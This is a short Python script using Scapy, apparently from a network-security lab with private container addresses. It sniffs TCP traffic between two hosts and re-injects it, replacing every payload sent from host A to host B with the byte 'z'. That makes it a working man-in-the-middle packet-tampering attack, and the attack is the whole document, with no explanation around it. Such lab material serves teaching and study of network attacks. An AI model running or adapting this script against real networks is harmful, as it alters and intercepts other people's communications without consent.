#!/usr/bin/env python3
from scapy.all import *

IP_A = "10.9.0.5"
MAC_A = "02:42:0a:09:00:05"
IP_B = "10.9.0.6"
MAC_B = "02:42:0a:09:00:06"

MAC_M = "02:42:0a:09:00:69"

def spoof_pkt(pkt):
    # A -> B
    if pkt[IP].src == IP_A and pkt[IP].dst == IP_B:
        # Create new packet
        newpkt = IP(bytes(pkt[IP]))
        del(newpkt.chksum)
        del(newpkt[TCP].payload)
        del(newpkt[TCP].chksum)

        # payload swap
        if pkt[TCP].payload:
            newdata = b'z'
            send(newpkt/newdata)
        else:
            send(newpkt)

    # B -> A
    elif pkt[IP].src == IP_B and pkt[IP].dst == IP_A:
        newpkt = IP(bytes(pkt[IP]))
        del(newpkt.chksum)
        del(newpkt[TCP].chksum)
        send(newpkt)

f = 'tcp and not ether src ' + MAC_M
pkt = sniff(iface='eth0',filter=f,prn=spoof_pkt)
